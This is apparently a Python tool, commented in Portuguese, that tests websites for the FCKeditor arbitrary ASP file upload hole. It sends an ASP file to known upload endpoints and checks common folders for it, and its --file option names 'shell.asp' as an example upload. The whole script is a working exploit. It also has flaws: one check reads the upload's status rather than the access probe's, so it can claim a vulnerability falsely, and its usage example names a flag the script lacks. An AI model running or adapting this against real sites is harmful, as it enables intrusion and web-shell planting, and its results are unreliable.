#!/usr/bin/env python3
"""
Uso responsável: execute APENAS em alvos que você possui permissão explícita para testar.

Dependências:
  pip install requests

Exemplo:
  python3 fckeditor_checker_v0_1.py http://example.com --filename probe.asp

Autor: jgbiispo
"""
import argparse
import requests
import uuid
import re
import sys
from urllib.parse import urlparse, urlunparse, urljoin

__version__ = "0.1"

TIMEOUT = 10
HEADERS = {
    "User-Agent": "fckeditor-checker/0.1 (+https://exemple.local/)"
}

FCK_PATHS = [
    "/editor/filemanager/upload/asp/upload.asp",
    "/fckeditor/editor/upload/upload.asp",
    "/fckeditor/editor/filemanager/upload/asp/upload.asp",
    "/filemanager/upload/asp/upload.asp",
]

POSSIBLE_UPLOAD_DIRS = [
        "/userfiles/File/",
    "/userfiles/Media/",
    "/userfiles/",
    "/uploads/",
   "/userfiles/Files/",
    "/uploads/Media/",
]

ASP_TEMPLATE = '<%% Response.ContentType = "text/plain"\nResponse.Write("VULN_TOKEN:%s") %%>'

def build_args():
    p = argparse.ArgumentParser(description="Testar upload de arquivos via FCKEditor")
    p.add_argument("target", help="URL base do alvo (ex: http://example.com or http://example.com/app/)")
    p.add_argument("--type", default="File", help="Valor do parâmetro Type no upload  (padrão: File)")
    p.add_argument("--file", default=None, help="Arquivo a enviar (ex: ./shell.asp)")
    p.add_argument("--timeout", type=int, default=TIMEOUT, help="Timeout em segundos")
    p.add_argument("--no-follow-fallback", action="store_true", help="Não tentar fallback em diretórios comuns")
    return p.parse_args()

def normalize_base(target):
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    if not target.endswith("/"):
        target += "/"
    return target

def find_endpois(base):
    return [urljoin(base, p.lstrip("/")) for p in FCK_PATHS]

def craft_payload(token):
    return ASP_TEMPLATE % token

def try_upload(session, url, filename, content, type_param="Media", timeout=TIMEOUT):
    files = {"NewFile": (filename, content, "application/octet-stream")}
    params = {"Type": type_param}
    try:
        return session.post(url, files=files, params=params, timeout=timeout, allow_redirects=True)
    except Exception:
        return None

def extract_path_from_response(resp_text):
    if not resp_text:
        return None
    m = re.search(r"(\/?[\w\/\-\._]*userfiles\/[\w\/\-\._]*?\.asp)", resp_text, flags=re.IGNORECASE)
    if m:
        return m.group(1)
    m2 = re.search(r"(\/?[\w\/\-\._]*?\.asp)", resp_text, flags=re.IGNORECASE)
    if m2:
        return m2.group(1)
    return None

def probe_access(session, base, candidate_path, timeout):
    base_parsed = urlparse(base)
    base_path = base_parsed.path
    if not base_path.endswith("/"):
        base_path += "/"
    
    if candidate_path.startswith("/"):
        candidate_path = candidate_path[1:]
    
    full_path = base_path + candidate_path
    
    url = urlunparse((
        base_parsed.scheme,
        base_parsed.netloc,
        full_path,
        '', '', ''
    ))
    
    try:
        return session.get(url, timeout=timeout, allow_redirects=True)
    except Exception:
        return None


def main():
    args = build_args()
    base = normalize_base(args.target)
    session = requests.Session()
    session.headers.update(HEADERS)

    token = str(uuid.uuid4()).split("-")[0]
    payload_content = craft_payload(token)
    filename = args.file or f"probe_{token}.asp"

    print(f"[+] Base target: {base}")
    print("[+] Gerando payload de prova (inofensivo) que imprime token único.")
    print(f"[+] Filename: {filename}")
    print(f"[+] Token esperado na resposta: VULN_TOKEN:{token}")
    print("-----------------------------------------------------")

    endpoints = find_endpois(base)
    found_any = False
    
    found_any = False

    for ep in endpoints:
        print(f"[>] Testando endpoint: {ep}  (Type={args.type})")
        resp = try_upload(session, ep, filename, payload_content, type_param=args.type, timeout=args.timeout)
        if resp is None:
            print("   - erro ao conectar/timeout.")
            continue

        print(f"   - status upload: {resp.status_code}")
        path = extract_path_from_response(resp.text)
        if path:
            print(f"   - possível caminho retornado pelo upload: {path}")
            r2 = probe_access(session, base, path, timeout=args.timeout)
            if resp.status_code == 200:
                print(f"   !!! Vulnerável! arquivo acessível em: {urljoin(base, path.lstrip('/'))}")
                found_any = True
                break
            else:
                print("   - não foi possível confirmar execução a partir do caminho retornado.")
        else:
            print("   - o endpoint não revelou caminho no corpo da resposta.")


        if args.no_follow_fallback or resp.status_code == 404:
            continue
        else:
            for d in POSSIBLE_UPLOAD_DIRS:
                candidate = urljoin(base, d.lstrip("/")) + filename
                print(f"   -> tentando fallback: {candidate}")
                r3 = probe_access(session, base, d.lstrip("/") + filename, timeout=args.timeout)
                if r3 and r3.status_code == 200 and f"VULN_TOKEN:{token}" in r3.text:
                    print(f"   !!! Vulnerável! arquivo acessível em: {candidate}")
                    found_any = True
                    break
            if found_any:
                break

    if not found_any:
        print("[-] Não foi possível confirmar vulnerabilidade com os endpoints/testes executados.")
        print("    Sugestões:")
        print("      * Verifique se o caminho base está correto.")
        print("      * Tente alternar o parâmetro --type (ex: File, Image, etc.).")
        print("      * Verifique respostas do servidor manualmente — alguns uploads retornam o caminho via JavaScript.")
    else:
        print("[+] Fim: vulnerabilidade confirmada (ou provável) — veja indicação acima.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAborted by user")
        sys.exit(1)
